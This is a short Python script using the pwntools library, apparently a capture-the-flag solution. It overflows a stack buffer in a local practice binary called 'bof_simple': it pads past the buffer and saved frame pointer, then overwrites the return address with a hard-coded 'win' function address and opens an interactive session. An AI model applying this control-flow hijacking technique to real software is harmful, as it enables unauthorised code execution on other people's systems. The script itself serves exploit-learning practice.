from pwn import *

p = process("pwn2/bof_simple")

mes = "a" * 0x20

mes += 'a' * 8

win_address = 0x400596

mes += p64(win_address)

p.sendline(mes)

p.interactive()
